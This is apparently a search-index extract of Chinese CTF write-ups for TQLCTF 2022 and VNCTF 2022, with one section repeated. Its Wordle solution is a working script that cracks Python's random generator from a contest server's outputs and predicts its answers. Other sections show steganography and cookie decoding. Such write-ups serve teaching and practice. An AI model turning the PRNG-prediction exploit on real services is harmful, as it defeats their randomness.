\u53ef\u4ee5\u53d1\u73b0\u5411\u53f3\u8d70\u4e00\u6bb5\u540e\u4f1a\u8d70\u4e0d\u52a8\uff0c\u800c\u5411\u5de6\u8d70\u53ef\u4ee5\u4e0d\u65ad\u5f97\u5230 click\uff0c\u901a\u8fc7\u4e24\u4e2a click \u4e4b\u95f4\u7684\u5750\u6807\u5dee\u53ef\u4ee5\u5f97\u5230\u5730\u56fe\u7684\u6a2a\u5411\u5927\u5c0f\u7ea6 75 \u6240\u4ee5\u4e4b\u540e\u7684\u6a2a\u5411\u5750\u6807\u5c31\u53ef\u4ee5\u5bf9 75 \u53d6\u6a21 \u540c\u65f6\u4e5f\u53ef\u4ee5\u53d1\u73b0\u6bcf\u6b21\u5411\u53f3\u8d70\u5230\u8d70\u4e0d\u52a8\u7684\u8ddd\u79bb\u4e0d\u4e00\u5b9a \u8fd9\u8bf4\u660e\u8d77\u59cb\u4f4d\u7f6e\u5e76\u4e0d\u56fa\u5b9a\uff0c\u6240\u4ee5\u9700\u8981\u5148\u79fb\u52a8\u5230\u4e0d\u80fd\u52a8\uff0c\u518d\u91cd\u7f6e\u5750\u6807\uff0c\u8fd9\u6837\u4f1a\u6e05\u695a\u5f88\u591a \u7136\u540e\u5c31\u662f\u76f2\u7740\u8d70\u8ff7\u5bab\uff0c\u7528\u4e86 pygame \u6765\u7ed8\u5236\u5230\u8fbe\u7684\u70b9\uff0c\u4ee5\u53ca\u53d1\u751f click \u7684\u4f4d\u7f6e \u4ee3\u7801 from pwn import * import pygame from pygame.locals import * p = process ([ \"python\" , \"main.py\" ]) # \u672c\u5730\u590d\u73b0 X , Y = 0 , 0 width = 75 pygame . init () WHITE = ( 255 , 255 , 255 ) GREEN = ( 0 , 255 , 0 ) RED = ( 255 , 0 , 0 ) BLUE = ( 0 , 0 , 255 ) size = width , height = 800 , 1000 clock = pygame . time . Clock () screen = pygame . display . set_mode ( size ) pygame . display . set_caption ( \"nanomaze\" ) screen . fill ( WHITE ) pygame . display . flip () def send ( direction ): res = p . recvuntil ( b \"> \" ) click = False if \"[click]\" in res . decode ( \"utf-8\" ): click = True p . sendline ( direction . encode ( \"utf-8\" )) return click , p . recvline () . decode ( \"utf-8\" ) . strip () def update_value ( direction , value ): global X , Y if direction == \"w\" : X -= value elif direction == \"a\" : Y -= value elif direction == \"s\" : X += value else : Y += value if Y < 0 : Y += 75 def move ( direction , aim = None ): if aim is None : times = 0 while times < 20 : click , res = send ( direction ) if click : log . info ( f \"click at ( { X } , { Y } )\" ) return if \"Cannot be moved\" in res : times += 1 else : update_value ( direction , float ( res . split ()[ 2 ])) times = 0 # log.info(f\" {direction} move to: ({X}, {Y})\") log . info ( f \" { direction } to bound: ( { X } , { Y } )\" ) else : now = int ( X ) if direction in \"ws\" else int ( Y ) while abs (( int ( X ) if direction in \"ws\" else int ( Y )) - now ) != aim : click , res = send ( direction ) if click : log . info ( f \"click at ( { X } , { Y } )\" ) pygame . display . update () pygame . draw . circle ( screen , RED , [ 20 + Y * 10 , 20 + X * 10 ], 10 , 2 ) pygame . display . update () if \"Cannot be moved\" not in res : update_value ( direction , float ( res . split ()[ 2 ])) else : log . info ( f \"Can't move to { aim } in { direction } \" ) break log . info ( f \" { direction } move to: ( { X } , { Y } )\" ) return True move ( \"w\" ) move ( \"d\" ) X , Y = 0 , 75 # \u56fa\u5b9a\u8d77\u59cb\u4f4d\u7f6e def w ( cnt = 1 ): # \u4fbf\u4e8e\u4ea4\u4e92 for _ in range ( cnt ): move ( \"w\" , 1 ) pygame . draw . circle ( screen , BLUE , [ 20 + Y * 10 , 20 + X * 10 ], 5 , 5 ) pygame . display . update () def a ( cnt = 1 ): for _ in range ( cnt ): move ( \"a\" , 1 ) pygame . draw . circle ( screen , BLUE , [ 20 + Y * 10 , 20 + X * 10 ], 5 , 5 ) pygame . display . update () def s ( cnt = 1 ): for _ in range ( cnt ): move ( \"s\" , 1 ) pygame . draw . circle ( screen , BLUE , [ 20 + Y * 10 , 20 + X * 10 ], 5 , 5 ) pygame . display . update () def d ( cnt = 1 ): for _ in range ( cnt ): move ( \"d\" , 1 ) pygame . draw . circle ( screen , BLUE , [ 20 + Y * 10 , 20 + X * 10 ], 5 , 5 ) pygame . display . update () while True : pygame . display . update () pygame . draw . circle ( screen , BLUE , [ 20 + Y * 10 , 20 + X * 10 ], 5 , 5 ) pygame . display . update () op = input ( \"> \" ) exec ( op ) \u7ed3\u679c\uff1a nano \u7ed9\u7684\u6807\u51c6\u5730\u56fe\uff1a \u5c31\u662f revomaze \u7684\u5730\u56fe\uff0c \u8fd9\u4e2a\u89c6\u9891 \u7684\u6700\u540e\u6709\u5efa\u6a21\u6f14\u793a","title":"TQLCTF 2022"},{"location":"writeups/tqlctf2022/#tqlctf-2022-writeup","text":"Abstract \u6e05\u534e\u4e3b\u529e\u7684\u6bd4\u8d5b\uff0cmisc \u57fa\u672c\u90fd\u662f NanoApe \u51fa\u7684\uff0c\u8d28\u91cf\u9ad8\u7684\u5f88 nano \u7684\u5b98\u65b9 writeup","title":"TQLCTF 2022 Writeup"},{"location":"writeups/tqlctf2022/#ranma12","text":"\u6253\u5f00 flag \u5341\u516d\u8fdb\u5236\uff0c\u662f\u4e00\u4e2a\u975e\u6807\u51c6\u7684 UTF-8 \u7f16\u7801\uff0c\u4e5f\u5c31\u662f\u90e8\u5206\u53ef\u4ee5\u4e00\u4e2a\u5b57\u8282\u8868\u793a\u4e00\u4e2a\u5b57\u7b26\u7684\uff0c\u5199\u6210\u4e86\u7b26\u5408 UTF-8 \u7f16\u7801\u539f\u7406\u7684\u4e24\u4e2a\u5b57\u8282\uff0c\u5bfc\u81f4\u7f16\u8f91\u5668\u65e0\u6cd5\u6b63\u5e38\u8bfb\u53d6\uff08\u4f46\u662f vim \u80fd\u8bfb\u53d6\uff09 \u53ef\u4ee5\u5f97\u5230\u4e00\u4e32\u5bc6\u6587\uff1a KGR/QRI 10646-1 zswtqgg d tnxcs tsdtofbrx osk ndnzhl gna Ietygfviy Idoilfvsu Arz (QQJ) hkkqk maikaglvusv ubyp cw ekg krzyj'o kitwkbj alypsdd. Wjs rzvmebrwoa duwcuosu pqecgqamo cw ekg IFA, uussmpu, ysum aup qfxschljyk swks pcbb khxnsee drdoqpgpwfyv cbg xeupctzou, oql gneg ylv nsg bb zds upygzrxzkjh fq XVT-8, wpr uxxvnw qt wpvy isdz. XVT-8 kif zds tsdtofbrxegktf qt szryafmtqi hkm sahz LD-DUQLQ egjuv, auqjllvtc qfxschljvrehp hlvv iqyk omjehog, sieyafj lqf cwprx ocwezcfh bugp fvwb qb XA-NYYWZ gdniha oap oip wtoqacgnsee wq cwprx rocfhu. HTTPZB{QFOLP6_KRZ1Q} \u5f88\u5bb9\u6613\u731c\u6d4b\u5f00\u5934\u5e94\u8be5\u662f ISO/IEC 10646-1\uff0c\u800c\u80fd\u5c06 I \u52a0\u5bc6\u4e3a\u4e0d\u540c\u5b57\u7b26\uff0c\u60f3\u5230\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801 \u67e5\u5230\u539f\u6587\u662f RFC 3629 \u7684 abstract: ISO/IEC 10646-1 defines a large character set called the Universal Character Set (UCS) which encompasses most of the world's writing systems. The originally proposed encodings of the UCS, however, were not compatible with many current applications and protocols, and this has led to the development of UTF-8, the object of this memo. UTF-8 has the characteristic of preserving the full US-ASCII range, providing compatibility with file systems, parsers and other software that rely on US-ASCII values but are transparent to other values. \u53cd\u63a8\u51fa key\uff1a CODINGWORLD \u89e3\u5bc6\u5f97\u5230\u7ed3\u5c3e\u7684 flag\uff1a TQLCTF{CODIN6_WOR1D}","title":"Ranma\u00bd"},{"location":"writeups/tqlctf2022/#wordle","text":"wordle \u6e38\u620f\uff0c\u8981\u6c42 512 \u5c40\u5168\u90e8\u731c\u5bf9 \u5148\u5199\u4e86\u4e00\u4e2a solver\uff0c\u6539\u5199\u7684 zulkarnine/WordleSolver easy \u548c normal \u96be\u5ea6\u5747\u6ca1\u6709 flag \u76f8\u5173\u4fe1\u606f\uff0c\u6240\u4ee5\u8981\u89e3\u51fa insane \u96be\u5ea6\uff0c\u5373 512 \u5c40\u5168\u90e8\u63a7\u5236\u5728 4 \u6b21\u4ee5\u5185\u731c\u51fa\u6765\uff0c\u4e0d\u73b0\u5b9e\uff0c\u627e\u5176\u5b83\u65b9\u6cd5 \u53d1\u73b0\u6bcf\u5c40\u90fd\u4f1a\u5148\u7ed9\u51fa\u4e00\u4e2a hex \u503c\uff0c\u800c\u4e14\u7b97\u6cd5\u5df2\u77e5\uff0c\u5e76\u4e14\u7531\u9898\u76ee\u6587\u4ef6\u4e2d\u6ce8\u91ca # To prevent the disclosure of answer \u77e5\u9053\u53cd\u63a8\u7b54\u6848\u4e0d\u73b0\u5b9e \u518d\u8003\u8651\u5230\u6574\u4e2a\u9898\u76ee\u662f\u5728\u4e00\u4e2a while True \u4ee5\u5185\u7684\uff0c\u89e3\u51fa\u4e00\u4e2a\u96be\u5ea6\u540e\u4e0d\u4f1a\u5173\u6389\u9898\u76ee\uff0c\u800c\u662f\u53ef\u4ee5\u7ee7\u7eed\u9009\u62e9\u96be\u5ea6\u7ee7\u7eed\u89e3\u9898 \u6240\u4ee5\u5b58\u5728\u7206\u7834 random \u6a21\u5757\u4f2a\u968f\u673a\u6570\u7684\u53ef\u80fd \u56e0\u4e3a hex \u503c\u7b97\u6cd5\u5df2\u77e5\uff1a id = random . randrange ( len ( valid_words ) * ( 2 ** 20 )) answer = valid_words [ id % len ( valid_words )] id = ( id // len ( valid_words )) ^ ( id % len ( valid_words )) return hex ( id )[ 2 :] . zfill ( 5 ), answer \u5982\u679c\u77e5\u9053\u7b54\u6848\u5219\u76f8\u5f53\u4e8e\u77e5\u9053 id % len(valid_words) \uff0c\u518d\u4e0e hex \u503c\u5f02\u6216\u53ef\u4ee5\u5f97\u5230 id // len(valid_words) \uff0c\u800c len(valid_words) \u5df2\u77e5\uff0c\u6240\u4ee5\u53ef\u4ee5\u76f4\u63a5\u63a8\u5f97 id \uff0c\u5373 randrange \u7684\u7ed3\u679c \u7206\u7834 random \u4f7f\u7528 tna0y/Python-random-module-cracker \uff0c\u9700\u8981 512 \u4e2a random \u7684\u7ed3\u679c \u8fdb\u884c\u4e24\u8f6e easy \u96be\u5ea6\uff08\u4f7f\u7528 solver\uff09\u5c31\u53ef\u4ee5\u5f97\u5230\u8fde\u7eed 512 \u4e2a\u4f2a\u968f\u673a\u6570\uff0c\u4f46\u662f\u5b58\u5728\u7206\u7834\u51fa\u9519\u7684\u53ef\u80fd\uff0c\u7b2c\u4e8c\u8f6e\u7684\u540e 400 \u4e2a\u53ef\u4ee5\u7528\u6765\u9a8c\u8bc1 \u5982\u679c\u540e 400 \u4e2a\u5b8c\u5168\u9884\u6d4b\u6b63\u786e\uff0c\u5c31\u53ef\u4ee5\u8fdb\u884c insane \u96be\u5ea6\uff0c\u76f4\u63a5\u9884\u6d4b\u968f\u673a\u6570\u8ba1\u7b97\u5f97\u5230\u7b54\u6848 \u5b8c\u6574\u4ee3\u7801 import re import sys from pwn import * from tqdm import tqdm from enum import Enum from collections import Counter from randcrack import RandCrack MAX_ATTEMPT = 6 class LetterVerdict ( Enum ): GREEN = 1 YELLOW = 2 GRAY = 3 class AttemptVerdict ( Enum ): WON = 1 LOST = 2 FAILED_ATTEMPT = 3 INVALID_TRY = 4 INVALID_WORD = 5 def get_all_wordle_words (): with open ( \"valid_words.txt\" , \"r\" ) as infile : return [ line . strip () for line in infile . readlines ()] class WordleSolver : def __init__ ( self ): self . __all_possible_words = set ( get_all_wordle_words ()) self . __invalid_letters = set () self . __untried_letters = set () self . __candidate_words = [] self . __green_blocks = set () self . __yellow_blocks = set () self . attempt = 0 self . game_number = - 1 self . tries = [] self . reset () def reset ( self ): self . __invalid_letters . clear () self . __candidate_words = sorted ( list ( self . __all_possible_words )) self . __yellow_blocks . clear () self . __green_blocks . clear () self . attempt = 0 self . __untried_letters = set ( chr ( ord ( 'a' ) + i ) for i in range ( 26 )) self . game_number += 1 self . tries . clear () def __contains_forbidden_letters ( self , word ): for ind , c in enumerate ( word ): if ( c , ind ) not in self . __green_blocks : # here fix a bug in if c in self . __invalid_letters : # the original solver return True return False def __get_untried_letter_probability ( self , words ): counter = Counter () for w in words : for c in w : if c in self . __untried_letters : counter [ c ] += 1 return counter def __get_letter_freq_map ( self , words ): counter = Counter () for w in words : for c in w : counter [ c ] += 1 return counter def __matches_green_constraints ( self , word ): for letter , index in self . __green_blocks : if word [ index ] != letter : return False return True def __matches_yellow_constraints ( self , word ): for letter , index in self . __yellow_blocks : if word [ index ] == letter or letter not in word : return False return True def __filter_out_invalid_words ( self ): new_candidates = [] for word in self . __candidate_words : if self . __contains_forbidden_letters ( word ) or not self . __matches_green_constraints ( word ) or not self . __matches_yellow_constraints ( word ): continue new_candidates . append ( word ) self . __candidate_words = new_candidates def __make_educated_guess ( self ): untried_letters = self . __get_untried_letter_probability ( self . __candidate_words ) freq_map = self . __get_letter_freq_map ( self . __candidate_words ) if len ( untried_letters ) > 1 and self . attempt <= MAX_ATTEMPT - 1 : word_with_score = [] word_list = self . __all_possible_words for word in word_list : letters = set ( word ) untried_score = sum ( untried_letters [ c ] if c in untried_letters else 0 for c in letters ) freq_score = sum ( freq_map [ c ] for c in letters ) word_with_score . append (( word , untried_score , freq_score )) ranked_words = sorted ( word_with_score , key = lambda item : ( - item [ 1 ], - item [ 2 ], item [ 0 ])) guess = ranked_words [ 0 ][ 0 ] else : guess = sorted ( self . __candidate_words , key = lambda word : ( - len ( set ( word )), - sum ( freq_map [ c ] for c in word ), word ) )[ 0 ] return guess def __pick_a_word ( self ): self . __filter_out_invalid_words () if len ( self . __candidate_words ) == 0 : # for debug res = input ( \">>> \" ) return res . strip () elif len ( self . __candidate_words ) == 1 : return self . __candidate_words [ 0 ] return self . __make_educated_guess () def solve ( self , wordle ): last_guess = \"\" wordle . p . recvuntil ( b \"#\" ) hex_id = wordle . p . recvline () . decode ( \"utf-8\" ) . strip () while True : self . attempt += 1 guess = self . __pick_a_word () if last_guess == guess : # here fix a bug in the original solver self . __candidate_words . remove ( guess ) guess = self . __pick_a_word () result , letter_verdicts = wordle . guess ( guess ) last_guess = guess self . tries . append ( guess ) if result == AttemptVerdict . WON : return hex_id , guess elif result == AttemptVerdict . LOST : return False elif result == AttemptVerdict . FAILED_ATTEMPT : for chr in guess : self . __untried_letters . discard ( chr ) for i in range ( len ( letter_verdicts )): letter , verdict = letter_verdicts [ i ] if verdict == LetterVerdict . GRAY : flag = True for ( l , _ ) in self . __yellow_blocks : # here fix a bug in if l == letter : # the original solver flag = False break if flag : self . __invalid_letters . add ( letter ) elif verdict == LetterVerdict . GREEN : self . __green_blocks . add (( letter , i )) if ( letter , i ) in self . __yellow_blocks : self . __yellow_blocks . remove (( letter , i )) elif verdict == LetterVerdict . YELLOW : self . __yellow_blocks . add (( letter , i )) else : exit ( 1 ) elif result == AttemptVerdict . INVALID_WORD : self . attempt -= 1 self . __candidate_words . remove ( guess ) self . __all_possible_words . remove ( guess ) class Wordle : def __init__ ( self , mode ): self . p = connect ( \"47.106.102.129\" , 23370 ) self . p . sendlineafter ( b \"> \" , str ( mode ) . encode ( \"utf-8\" )) def restart ( self , mode ): self . p . sendlineafter ( b \"> \" , str ( mode ) . encode ( \"utf-8\" )) def guess ( self , word ): self . p . sendlineafter ( b \"> \" , word . encode ( \"utf-8\" )) status = self . p . recvuntil ( b \"!\" ) if status == b \"Correct!\" : return AttemptVerdict . WON , None result = self . p . recvline () . decode ( \"utf-8\" ) res = re . findall ( r \"\\[4(\\d)m\" , result ) ret = [] for i in range ( 5 ): c = word [ i ] if res [ i ] == \"7\" : ret . append (( c , LetterVerdict . GRAY )) elif res [ i ] == \"3\" : ret . append (( c , LetterVerdict . YELLOW )) else : ret . append (( c , LetterVerdict . GREEN )) attempt_verdict = AttemptVerdict . WON for _ , verdict in ret : if verdict != LetterVerdict . GREEN : attempt_verdict = AttemptVerdict . FAILED_ATTEMPT break return attempt_verdict , ret cracker = RandCrack () wordle = Wordle ( 0 ) solver = WordleSolver () def calc_random_id ( hex_id , word ): valid_words = get_all_wordle_words () length = len ( valid_words ) index = valid_words . index ( word ) # id % len(valid_words) Id = eval ( \"0x\" + hex_id ) tmp = Id ^ index # id // len(valid_words) return tmp * length + index def calc_hex_id_and_word ( random_value ): valid_words = get_all_wordle_words () length = len ( valid_words ) word = valid_words [ random_value % length ] hex_value = ( random_value // length ) ^ ( random_value % length ) return hex ( hex_value )[ 2 :] . zfill ( 5 ), word with tqdm ( total = 624 , desc = \"Cracking random...\" ) as pbar : for i in range ( 512 ): solver . reset () hex_id , answer = solver . solve ( wordle ) random_value = calc_random_id ( hex_id , answer ) cracker . submit ( random_value ) pbar . update ( 1 ) wordle . restart ( 0 ) for i in range ( 112 ): solver . reset () hex_id , answer = solver . solve ( wordle ) random_value = calc_random_id ( hex_id , answer ) cracker . submit ( random_value ) pbar . update ( 1 ) with tqdm ( total = 400 , desc = \"Verifying crack result...\" ) as pbar : for i in range ( 400 ): solver . reset () predict = cracker . predict_randrange ( 4090 * ( 2 ** 20 )) p_hex_id , p_answer = calc_hex_id_and_word ( predict ) hex_id , answer = solver . solve ( wordle ) if p_hex_id != hex_id : print ( f \"Crack faild: \\n predict: { p_hex_id } , { p_answer } \\n challenge: { hex_id } , { answer } \" ) sys . exit ( 1 ) pbar . update ( 1 ) wordle . p . sendlineafter ( b \"> \" , b \"3\" ) # insane level with tqdm ( total = 512 , desc = \"Solving insane level...\" ) as pbar : for i in range ( 512 ): wordle . p . recvuntil ( b \"#\" ) hex_id = wordle . p . recvline () . decode ( \"utf-8\" ) . strip () predict = cracker . predict_randrange ( 4090 * ( 2 ** 20 )) p_hex_id , p_answer = calc_hex_id_and_word ( predict ) if hex_id != p_hex_id : print ( f \"Predict failed: \\n predic: { p_hex_id } \\n challenge: { hex_id } \" ) sys . exit ( 1 ) wordle . p . sendlineafter ( b \"> \" , p_answer . encode ( \"utf-8\" )) pbar . update ( 1 ) wordle . p . interactive ()","title":"wordle"},{"location":"writeups/tqlctf2022/#the-ohio-state-university","text":"\u9898\u76ee\u63d0\u4f9b\u4e86 .osz \u6587\u4ef6\uff0c\u662f osu! \u6e38\u620f\u8c31\u9762\u7684\u538b\u7f29\u6587\u4ef6\uff0c\u53ef\u4ee5\u901a\u8fc7\u6e38\u620f\u76f4\u63a5\u6253\u5f00\uff0c\u6216\u8005\u89e3\u538b\u83b7\u5f97\u7d20\u6750\u6587\u4ef6 \u5728osu\u5b98\u7f51\u641c\u7d22\u5230\u5bf9\u5e94\u7684\u8c31\u9762\u5e76\u4e0b\u8f7d\uff1a https://osu.ppy.sh/beatmapsets/1235288#mania/2568956 \u5c06\u4e24\u4efd\u8c31\u9762\u89e3\u538b\uff0c\u6bd4\u8f83\u6587\u4ef6\u4e0d\u540c \u80cc\u666f\u56fe\u7247\u7684 exif \u91cc\u6709\u4e00\u9879\u5c5e\u6027\uff1a pwd: VVelcome!! \u63a8\u6d4b\u56fe\u7247\u4f1a\u6709\u5e26\u5bc6\u7801\u7684\u9690\u85cf\u5185\u5bb9\uff0csteghide \u89e3\u5bc6\u5f97\u5230 flag \u5f00\u5934\uff1a TQLCTF{VVElcOM3 BASIC \u96be\u5ea6\u8c31\u9762\u6587\u4ef6\u6709\u4e00\u884c\u5dee\u5f02\uff1a WAVPassword: MisoilePunch \u6697\u793a\u4e86 wav \u97f3\u9891\u6587\u4ef6\u4f1a\u6709\u9690\u85cf\u5185\u5bb9\uff0c\u4f7f\u7528 SilentEye \u5373\u53ef\u63d0\u53d6 \u62ff\u5230 flag \u4e2d\u95f4\u90e8\u5206 _TO_O$u_i7s_ \u6700\u540e\u8fd8\u5269\u4e0b VIVID \u96be\u5ea6\u8c31\u9762\uff0c\u6bd4\u5bf9\u53d1\u73b0\u8c31\u9762\u5c3e\u6740\u88ab\u6539\u4e86 \u5269\u4e0b\u4e00\u90e8\u5206\u662f flag \u7684\u7ed3\u5c3e\uff0c\u6240\u4ee5\u7ed3\u5c3e\u5e94\u8be5\u662f }\uff0c\u5176\u5bf9\u5e9416\u8fdb\u5236\u503c\u4e3a 7D\uff0c\u4e8c\u8fdb\u5236 0111 1101\uff0c\u53d1\u73b0\u7ed3\u5c3e\u786e\u5b9e\u6709\u7c7b\u4f3c 0111 1101 \u7684 note \u7136\u540e\u8bb0\u5f55\u6240\u6709 note\uff0c\u8f6c\u6362\u4e3a\u5b57\u7b26\u5c31\u53ef\u4ee5\u62ff\u5230\u6700\u540e\u4e00\u90e8\u5206flag\uff1a5HoWtIme} \u62fc\u63a5\u5f97\u5230\u5b8c\u6574flag\uff1aTQLCTF{VVElcOM3_TO_O$u_i7s_5HoWtIme}","title":"the Ohio State University"},{"location":"writeups/tqlctf2022/#nanomaze","text":"\u662f nano \u590d\u523b\u7684 revomaze green \u8ff7\u5bab \u4e3b\u8981\u73a9\u6cd5\u5c31\u662f\u6574\u4e2a\u5730\u56fe\u5728\u5de6\u53f3\u65b9\u5411\u4e0a\u662f\u5faa\u73af\u7684\uff08\u5730\u56fe\u5377\u6210\u4e00\u4e2a\u5706\u7b52\uff09 \u6574\u4e2a\u8ff7\u5bab\u5730\u56fe\u5305\u542b\u9ad8\u5ea6\uff0c\u6bcf\u6b21\u53ea\u80fd\u5411\u540c\u9ad8\u5ea6\u8d70\uff0c\u9ad8\u5ea6\u4e0b\u964d\u4e86\u5c31\u4f1a\u6536\u5230 [click] \u63d0\u793a\uff0c\u8fd9\u4e4b\u540e\u4e5f\u5c31\u4e0d\u80fd\u518d\u539f\u8def\u8fd4\u56de\u4e86 \u5e76\u4e14\u6709\u7279\u6b8a\u4f4d\u7f6e\u53ef\u4ee5\u4f7f\u9ad8\u5ea6\u4e0a\u5347\uff08\u7b2c\u4e00\u884c\u67d0\u5904\uff09 \u76ee\u6807\u662f\u5230\u8fbe\u5730\u56fe\u7684\u6700\u4e0b\u9762\u4e00\u5c42\u7684\u67d0\u4e2a\u4f4d\u7f6e \u7531\u4e8e\u5de6\u53f3\u5faa\u73af\uff0c\u6240\u4ee5\u5148\u627e\u5230\u5730\u56fe\u7684\u6a2a\u5411\u5927\u5c0f \u53ef\u4ee5\u53d1\u73b0\u5411\u53f3\u8d70\u4e00\u6bb5\u540e\u4f1a\u8d70\u4e0d\u52a8\uff0c\u800c\u5411\u5de6\u8d70\u53ef\u4ee5\u4e0d\u65ad\u5f97\u5230 click\uff0c\u901a\u8fc7\u4e24\u4e2a click \u4e4b\u95f4\u7684\u5750\u6807\u5dee\u53ef\u4ee5\u5f97\u5230\u5730\u56fe\u7684\u6a2a\u5411\u5927\u5c0f\u7ea6 75 \u6240\u4ee5\u4e4b\u540e\u7684\u6a2a\u5411\u5750\u6807\u5c31\u53ef\u4ee5\u5bf9 75 \u53d6\u6a21 \u540c\u65f6\u4e5f\u53ef\u4ee5\u53d1\u73b0\u6bcf\u6b21\u5411\u53f3\u8d70\u5230\u8d70\u4e0d\u52a8\u7684\u8ddd\u79bb\u4e0d\u4e00\u5b9a \u8fd9\u8bf4\u660e\u8d77\u59cb\u4f4d\u7f6e\u5e76\u4e0d\u56fa\u5b9a\uff0c\u6240\u4ee5\u9700\u8981\u5148\u79fb\u52a8\u5230\u4e0d\u80fd\u52a8\uff0c\u518d\u91cd\u7f6e\u5750\u6807\uff0c\u8fd9\u6837\u4f1a\u6e05\u695a\u5f88\u591a \u7136\u540e\u5c31\u662f\u76f2\u7740\u8d70\u8ff7\u5bab\uff0c\u7528\u4e86 pygame \u6765\u7ed8\u5236\u5230\u8fbe\u7684\u70b9\uff0c\u4ee5\u53ca\u53d1\u751f click \u7684\u4f4d\u7f6e \u4ee3\u7801 from pwn import * import pygame from pygame.locals import * p = process ([ \"python\" , \"main.py\" ]) # \u672c\u5730\u590d\u73b0 X , Y = 0 , 0 width = 75 pygame . init () WHITE = ( 255 , 255 , 255 ) GREEN = ( 0 , 255 , 0 ) RED = ( 255 , 0 , 0 ) BLUE = ( 0 , 0 , 255 ) size = width , height = 800 , 1000 clock = pygame . time . Clock () screen = pygame . display . set_mode ( size ) pygame . display . set_caption ( \"nanomaze\" ) screen . fill ( WHITE ) pygame . display . flip () def send ( direction ): res = p . recvuntil ( b \"> \" ) click = False if \"[click]\" in res . decode ( \"utf-8\" ): click = True p . sendline ( direction . encode ( \"utf-8\" )) return click , p . recvline () . decode ( \"utf-8\" ) . strip () def update_value ( direction , value ): global X , Y if direction == \"w\" : X -= value elif direction == \"a\" : Y -= value elif direction == \"s\" : X += value else : Y += value if Y < 0 : Y += 75 def move ( direction , aim = None ): if aim is None : times = 0 while times < 20 : click , res = send ( direction ) if click : log . info ( f \"click at ( { X } , { Y } )\" ) return if \"Cannot be moved\" in res : times += 1 else : update_value ( direction , float ( res . split ()[ 2 ])) times = 0 # log.info(f\" {direction} move to: ({X}, {Y})\") log . info ( f \" { direction } to bound: ( { X } , { Y } )\" ) else : now = int ( X ) if direction in \"ws\" else int ( Y ) while abs (( int ( X ) if direction in \"ws\" else int ( Y )) - now ) != aim : click , res = send ( direction ) if click : log . info ( f \"click at ( { X } , { Y } )\" ) pygame . display . update () pygame . draw . circle ( screen , RED , [ 20 + Y * 10 , 20 + X * 10 ], 10 , 2 ) pygame . display . update () if \"Cannot be moved\" not in res : update_value ( direction , float ( res . split ()[ 2 ])) else : log . info ( f \"Can't move to { aim } in { direction } \" ) break log . info ( f \" { direction } move to: ( { X } , { Y } )\" ) return True move ( \"w\" ) move ( \"d\" ) X , Y = 0 , 75 # \u56fa\u5b9a\u8d77\u59cb\u4f4d\u7f6e def w ( cnt = 1 ): # \u4fbf\u4e8e\u4ea4\u4e92 for _ in range ( cnt ): move ( \"w\" , 1 ) pygame . draw . circle ( screen , BLUE , [ 20 + Y * 10 , 20 + X * 10 ], 5 , 5 ) pygame . display . update () def a ( cnt = 1 ): for _ in range ( cnt ): move ( \"a\" , 1 ) pygame . draw . circle ( screen , BLUE , [ 20 + Y * 10 , 20 + X * 10 ], 5 , 5 ) pygame . display . update () def s ( cnt = 1 ): for _ in range ( cnt ): move ( \"s\" , 1 ) pygame . draw . circle ( screen , BLUE , [ 20 + Y * 10 , 20 + X * 10 ], 5 , 5 ) pygame . display . update () def d ( cnt = 1 ): for _ in range ( cnt ): move ( \"d\" , 1 ) pygame . draw . circle ( screen , BLUE , [ 20 + Y * 10 , 20 + X * 10 ], 5 , 5 ) pygame . display . update () while True : pygame . display . update () pygame . draw . circle ( screen , BLUE , [ 20 + Y * 10 , 20 + X * 10 ], 5 , 5 ) pygame . display . update () op = input ( \"> \" ) exec ( op ) \u7ed3\u679c\uff1a nano \u7ed9\u7684\u6807\u51c6\u5730\u56fe\uff1a \u5c31\u662f revomaze \u7684\u5730\u56fe\uff0c \u8fd9\u4e2a\u89c6\u9891 \u7684\u6700\u540e\u6709\u5efa\u6a21\u6f14\u793a","title":"Nanomaze"},{"location":"writeups/vnctf2022/","text":"VNCTF 2022 Writeup \u00b6 Abstract \u5bd2\u5047\u91cc\u7684\u4e00\u573a\u4e2a\u4eba\u8d5b\uff0c\u968f\u4fbf\u6253\u7740\u73a9\u4e86\u73a9\uff0c\u505a\u4e86\u51e0\u4e2a misc\uff0c\u548c\u50cf misc \u7684 web/rev/crypto\uff0c\u6392\u4e86 35 \u6709\u51e0\u9053\u9898\u5dee\u70b9\u5c31\u80fd\u505a\u51fa\u6765\uff0c\u8fd9\u91cc\u4e5f\u90fd\u5199\u4e0b\u6765\u4e86 VNCTF 2022 Official WriteUp GameV4.0 \u00b6 web \u7c7b\u578b\u7684\u7b7e\u5230\u9898 \u5f00\u59cb\u8fd8\u53bb\u8ba4\u771f\u5730\u73a9\u4e86\u8fd9\u4e2a\u6e38\u620f\uff0c\u7136\u540e\u6253\u5b8c flag \u5173\u4e5f\u6ca1\u6709\u770b\u5230 flag\uff0c\u5c31\u53bb\u7ffb\u4e86\u6e90\u7801 \u53d1\u73b0\u4e86 data.js \u8fd9\u4e2a\u6587\u4ef6\u4fdd\u5b58\u4e86\u6240\u6709\u5173\u5361\u7684\u6570\u636e\uff0c\u7136\u540e\u5728\u6587\u4ef6\u7684\u6700\u672b\u5c3e\u6709\u4e00\u884c \"ZmxhZw==\" : \"Vk5DVEYlN0JXZWxjb21lX3RvX1ZOQ1RGMjAyMiU3RA==\" base64 \u89e3\u7801\uff0c\u7136\u540e URL \u89e3\u7801\uff0c\u5f97\u5230\uff1aflag: VNCTF{Welcome_to_VNCTF2022} gocalc0 \u00b6 \u770b\u6837\u5b50\u662f\u975e\u9884\u671f\u4e86 \u70b9\u8fdb flag \u5728\u8fd9\u91cc\uff0c\u91cc\u9762\u8bf4 flag is in your session\uff0c\u6253\u5f00 cookies \u53d1\u73b0\uff1a session: MTY0NDk4ODEyMnxEdi1CQkFFQ180SUFBUkFCRUFBQVNQLUNBQUVHYzNSeWFXNW5EQVlBQkVaTVFVY0djM1J5YVc1bkRDd0FLbVpzWVdkN01EWXlZamcyWlRNdE1tSTFNaTAwTURFMUxUZzJNall0TjJFNVkyVTVORFV4TldZMGZRPT18sud3sUmK5woUfaXQnzZ_R_eu8wGDMVPjfgXvyKo99os= base64 \u89e3\u7801\u540e\u53d1\u73b0\u91cc\u9762\u8fd8\u6709\u4e00\u6bb5 base64\uff0c\u7ee7\u7eed\u89e3\u7801\uff0c\u5c31\u6709 flag \u4e86\uff1a flag{062b86e3-2b52-4015-8626-7a9ce94515f4} ezmath \u00b6 \u4e00\u9053\u6ca1\u4ec0\u4e48\u542b\u91d1\u91cf\u7684 crypto \u9898\u76ee\u95ee\u7b2c x 